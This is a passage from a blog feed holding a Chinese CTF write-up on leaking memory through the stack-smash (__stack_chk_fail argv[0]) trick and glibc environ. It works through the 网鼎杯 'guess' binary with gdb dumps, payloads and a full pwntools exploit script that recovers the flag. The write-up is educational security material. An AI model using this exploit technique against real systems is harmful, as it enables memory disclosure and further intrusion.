    <summary type="html">
    
      
      
        &lt;p&gt; 前段时间在逛知乎的时候，偶然发现一道有意思的编程题&lt;br&gt;&lt;img alt=&quot;知乎&quot; data-src=&quot;https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/7hf2r1wl6noec3akgedgzpbq
      
    
    </summary>
    
      <category term="c" scheme="https://nocbtm.github.io/categories/c/"/>
    
    
      <category term="c" scheme="https://nocbtm.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>__stack_chk_fail相关利用</title>
    <link href="https://nocbtm.github.io/2020/04/28/stack-chk-fail%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/28/stack-chk-fail相关利用/</id>
    <published>2020-04-28T03:27:57.000Z</published>
    <updated>2020-04-29T16:16:56.202Z</updated>
    
    <content type="html"><![CDATA[<p>在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。</p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="1-Stack-smash"><a href="#1-Stack-smash" class="headerlink" title="1. Stack smash"></a>1. Stack smash</h2><p>Linux 系统中，为了防御栈溢出漏洞的利用，通常会部署 Canary 漏洞缓解措施。Wiki 中对 Canary 的解释如下：</p><blockquote><p>Canaries or canary words are known values that are placed between a buffer and control data on the stack to monitor buffer overflows. When the buffer overflows, the first data to be corrupted will usually be the canary, and a failed verification of the canary data will therefore alert of an overflow, which can then be handled, for example, by invalidating the corrupted data.</p></blockquote><p>下面简单描述下 Canary 的原理。对于栈溢出漏洞的利用，最简单的方法就是通过溢出数据修改栈中函数返回地址为目标内存地址，当函数返回时将会跳转到目标内存处执行指令，从而实现控制流劫持。为了防御这种利用方法，分配栈空间时在 EBP-4 的位置存放一个 Canary 值，函数返回之前会校验该值是否被修改，若检测到被修改则调用 <code>__stack_chk_fail</code> 函数抛出异常并结束进程。可见，要覆盖函数返回地址必须修改 Canary，从而可防御该攻击方法。gcc 编译器默认开启该缓解机制，编译时可用 <code>-fno-stack-protector</code> 选项关闭该机制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> Low Address |                 |</span><br><span class="line">             +-----------------+</span><br><span class="line">     esp =&gt;  | local variables |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[0-3]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[4-7]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     canary      |</span><br><span class="line">             +-----------------+</span><br><span class="line">     ebp =&gt;  |     old ebp     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |   return addr   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |      args       |</span><br><span class="line">             +-----------------+</span><br><span class="line">High Address |                 |</span><br></pre></td></tr></table></figure><p>libc 中 <code>__stack_chk_fail</code> 的源码如下，该函数调用 <code>__fortify_fail</code> 输出异常信息，其中包含 libc_argv[0] 指向的程序名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminatedn&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若通过栈溢出漏洞可修改栈内存中 argv[0] 指针，那么触发 Stack smash 时可泄露内存信息。例如把 argv[0] 修改为 got 表项可泄露出内存中函数地址，为进一步利用提供条件。</p><h2 id="2-environ"><a href="#2-environ" class="headerlink" title="2. environ"></a>2. environ</h2><p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm      Name</span><br><span class="line">0x00400000         0x00401000         r-xp      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00601000         0x00602000         r--p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00602000         0x00603000         rw-p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdb000 0x00007ffff7fde000 rw-p      mapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p      [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]</span><br><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdc98</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdc98</span><br><span class="line">0000| 0x7fffffffdc98 --&gt; 0x7fffffffe0ae (&quot;XDG_SESSION_ID=c2&quot;)</span><br><span class="line">0008| 0x7fffffffdca0 --&gt; 0x7fffffffe0c0 (&quot;QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1&quot;)</span><br><span class="line">0016| 0x7fffffffdca8 --&gt; 0x7fffffffe0e3 (&quot;UNITY_DEFAULT_PROFILE=unity&quot;)</span><br><span class="line">0024| 0x7fffffffdcb0 --&gt; 0x7fffffffe0ff (&quot;GNOME_KEYRING_PID=&quot;)</span><br><span class="line">0032| 0x7fffffffdcb8 --&gt; 0x7fffffffe112 (&quot;GNOME_KEYRING_CONTROL=&quot;)</span><br><span class="line">0040| 0x7fffffffdcc0 --&gt; 0x7fffffffe129 (&quot;DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path&quot;)</span><br><span class="line">0048| 0x7fffffffdcc8 --&gt; 0x7fffffffe15c (&quot;LOGNAME=lc&quot;)</span><br><span class="line">0056| 0x7fffffffdcd0 --&gt; 0x7fffffffe167 (&quot;INSTANCE=&quot;)</span><br></pre></td></tr></table></figure><h1 id="实例分析-网鼎杯-pwn-guess"><a href="#实例分析-网鼎杯-pwn-guess" class="headerlink" title="实例分析  网鼎杯 pwn-guess"></a>实例分析  网鼎杯 pwn-guess</h1><p>下面通过调试 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/stack_smash" target="_blank" rel="noopener">网鼎杯的 pwn-GUESS</a> 的利用过程说明 Stack smash 利用方法。</p><h2 id="1-漏洞位置"><a href="#1-漏洞位置" class="headerlink" title="1. 漏洞位置"></a>1. 漏洞位置</h2><p>程序首先将 flag 读入内存中的 buf，用户有 3 次猜测 flag 的机会。通过 gets() 读取用户输入时存在栈溢出漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you have no sense... bye :-) &quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Please type your guessing flag&quot;);</span><br><span class="line">  gets(&amp;s2);         // overflow</span><br><span class="line">  if ( !strcmp(&amp;buf, &amp;s2) )</span><br><span class="line">    puts(&quot;You must have great six sense!!!! :-o &quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><p>首先查看程序开启的漏洞缓解机制，发现已开启 Canary 和 NX，未开启 PIE。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure><p>由于程序中 sub_400A11() 函数使用 fork 子进程的方式允许用户有 3 次猜测 flag 的机会，同时又将 flag 读入栈中，因此可利用 Stack smash 进行 3 次内存泄漏获得 flag。具体利用思路如下：</p><ul><li>通过栈溢出漏洞覆盖 argv[0] 为 <code>__libc_start_main</code> 的 got 表项，触发 Stack smash 可泄露 <code>__libc_start_main</code> 函数地址，利用给出的 libc 文件可计算得到 libc 基地址；</li><li>计算出 environ 在内存中的地址，第二次利用栈溢出漏洞覆盖 argv[0] 为 <code>environ</code> ，泄露出 environ 的值，即指向环境变量的栈地址；</li><li>根据栈内存中 flag 与 environ 值的偏移量计算出 flag 的栈地址，再次利用栈溢出漏洞覆盖 argv[0] 为 flag 的栈地址，从而可读取 flag 的值。</li></ul><h3 id="1）泄露-libc-基址"><a href="#1）泄露-libc-基址" class="headerlink" title="1）泄露 libc 基址"></a>1）泄露 libc 基址</h3><p>首先，从下图栈内存信息可知缓冲区 s2 地址为 0x7fffffffdb60， argv[0] 地址为 0x7fffffffdc88，从而可计算出 s2 与 argv[0] 间的偏移量为 0x128（0x7fffffffdc88-0x7fffffffdb60）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400b1b:    mov    rdi,rax</span><br><span class="line">   0x400b1e:    mov    eax,0x0</span><br><span class="line">   0x400b23:    call   0x400830 &lt;gets@plt&gt;</span><br><span class="line">=&gt; 0x400b28:    lea    rdx,[rbp-0x40]</span><br><span class="line">   0x400b2c:    lea    rax,[rbp-0x70]</span><br><span class="line">   0x400b30:    mov    rsi,rdx</span><br><span class="line">   0x400b33:    mov    rdi,rax</span><br><span class="line">   0x400b36:    call   0x400820 &lt;strcmp@plt&gt;</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0000000000400b28 in ?? ()</span><br><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0x7fffffffdb00 --&gt; 0x7fffffffdc88 --&gt; 0x7fffffffe091 (&quot;/home/lc/Desktop/guess/guess&quot;)</span><br><span class="line">0008| 0x7fffffffdb08 --&gt; 0x100000000 </span><br><span class="line">0016| 0x7fffffffdb10 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdb18 --&gt; 0x3 </span><br><span class="line">0032| 0x7fffffffdb20 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdb28 --&gt; 0x3 </span><br><span class="line">0048| 0x7fffffffdb30 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0056| 0x7fffffffdb38 (&quot;61991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0064| 0x7fffffffdb40 (&quot;943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0072| 0x7fffffffdb48 (&quot;57863eec75961&#125;\n&quot;)</span><br><span class="line">0080| 0x7fffffffdb50 --&gt; 0xa7d3136393537 (&apos;75961&#125;\n&apos;)</span><br><span class="line">0088| 0x7fffffffdb58 --&gt; 0x0 </span><br><span class="line">0096| 0x7fffffffdb60 (&apos;A&apos; &lt;repeats 16 times&gt;)</span><br><span class="line">0104| 0x7fffffffdb68 (&quot;AAAAAAAA&quot;)</span><br><span class="line">0112| 0x7fffffffdb70 --&gt; 0x0</span><br></pre></td></tr></table></figure><p>因此可构造以下 payload 将 argv[0] 覆盖为 <code>__libc_start_main</code> 的 got 表项，可泄露出 <code>__libc_start_main</code> 函数在内存中的地址，从而计算出 libc 的基址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;A&apos; * 0x128 + p64(libc_start_main_got)</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[&apos;__libc_start_main&apos;]</span><br></pre></td></tr></table></figure><p>泄露出 libc 基址为 0x7ffff7a0d000。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  40 d7 a2 f7  ff 7f 20 74  │ed *│**: │@···│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">libc_base_addr = 0x7ffff7a0d000</span><br></pre></td></tr></table></figure><h3 id="2）泄露-environ"><a href="#2）泄露-environ" class="headerlink" title="2）泄露 environ"></a>2）泄露 environ</h3><p>构造以下 payload，第二次利用栈溢出将 argv[0] 覆盖为 <code>environ</code> 的地址，从而泄露出 <code>environ</code> 的值，该值为执行环境变量的栈地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">environ_addr = libc_base_addr + libc.symbols[&apos;_environ&apos;]</span><br><span class="line">payload1 = &apos;A&apos; * 0x128 + p64(environ_addr)</span><br></pre></td></tr></table></figure><p>泄露出 <code>environ</code> 的值为 0x7fffffffdcf8。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  f8 dc ff ff  ff 7f 20 74  │ed *│**: │····│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">stack_addr = 0x7fffffffdcf8</span><br></pre></td></tr></table></figure><p>可在 gdb 中验证该值为正确的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdcf8</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdcf8</span><br><span class="line">0000| 0x7fffffffdcf8 --&gt; 0x7fffffffe0ea (&quot;INSTANCE=&quot;)</span><br><span class="line">0008| 0x7fffffffdd00 --&gt; 0x7fffffffe0f4 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)</span><br><span class="line">0016| 0x7fffffffdd08 --&gt; 0x7fffffffe12a (&quot;ALL_PROXY=socks://192.168.239.1:1080/&quot;)</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure><h3 id="3）读取-flag"><a href="#3）读取-flag" class="headerlink" title="3）读取 flag"></a>3）读取 flag</h3><p>查看内存中 flag 的地址为 0x7fffffffdb90，计算该地址与泄露栈地址的偏移量为 0x168（0x7fffffffdcf8 - 0x7fffffffdb90）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20                                                                                                                                             </span><br><span class="line">0000| 0x7fffffffdb08 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:  cmp    rax,0x0)</span><br><span class="line">0008| 0x7fffffffdb10 --&gt; 0x7ffff7dd3780 --&gt; 0x0 </span><br><span class="line">     ...</span><br><span class="line">0088| 0x7fffffffdb60 --&gt; 0x7fffffffdce8 --&gt; 0x7fffffffe0e2 --&gt; 0x73736575672f2e (&apos;./guess&apos;)</span><br><span class="line">0096| 0x7fffffffdb68 --&gt; 0x100000000 </span><br><span class="line">0104| 0x7fffffffdb70 --&gt; 0x8600000000 </span><br><span class="line">0112| 0x7fffffffdb78 --&gt; 0x3 </span><br><span class="line">0120| 0x7fffffffdb80 --&gt; 0x2 </span><br><span class="line">0128| 0x7fffffffdb88 --&gt; 0x3 </span><br><span class="line">0136| 0x7fffffffdb90 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">     ...</span><br></pre></td></tr></table></figure><p>构造以下 payload，第三次利用栈溢出覆盖 argv[0] 为 flag 的内存地址，从而可读取内存中的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = &apos;A&apos; * 0x128 + p64(stack_addr - 0x168)</span><br></pre></td></tr></table></figure><p>最终获取 flag 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x9b bytes:</span><br><span class="line">    &apos;You should take more effort to get six sence, and one more challenge!!\n&apos;</span><br><span class="line">    &apos;*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;\n&apos;</span><br><span class="line">    &apos; terminated\n&apos;</span><br><span class="line">You should take more effort to get six sence, and one more challenge!!</span><br><span class="line">*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;</span><br><span class="line"> terminated</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./guess'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_got = <span class="number">0x602048</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x400B23)    </span></span><br><span class="line"><span class="comment">#raw_input("leak libc_base")</span></span><br><span class="line">p.recvuntil(<span class="string">'guessing flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(libc_start_main_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">libc_start_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base_addr = '</span> + hex(libc_base_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak environ_addr")</span></span><br><span class="line">environ_addr = libc_base_addr + libc.symbols[<span class="string">'_environ'</span>]</span><br><span class="line">payload1 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(environ_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'stack smashing detected ***: '</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stack_addr = '</span> + hex(stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak flag")</span></span><br><span class="line">payload2 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'&#125;'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>References:</p><p><a href="http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/" target="_blank" rel="noopener">栈溢出 Stack smash 利用</a></p><p><a href="https://www.anquanke.com/post/id/161142#h2-0" target="_blank" rel="noopener">浅析ROP之Stack Smash</a></p><p> <a href="http://tacxingxing.com/2017/12/16/environ/" target="_blank" rel="noopener">Environ</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。&lt;/p&gt;
&lt;h1 id=&quot;利用思路&quot;&gt;&lt;a href=&quot;#利用思路&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>__do_global_dtors_aux的gadget</title>
    <link href="https://nocbtm.github.io/2020/04/21/%C2%96do-global-dtors-aux%E7%9A%84gadget/"/>
    <id>https://nocbtm.github.io/2020/04/21/do-global-dtors-aux的gadget/</id>
    <published>2020-04-21T03:30:39.000Z</published>
    <updated>2020-04-28T16:49:57.831Z</updated>
    
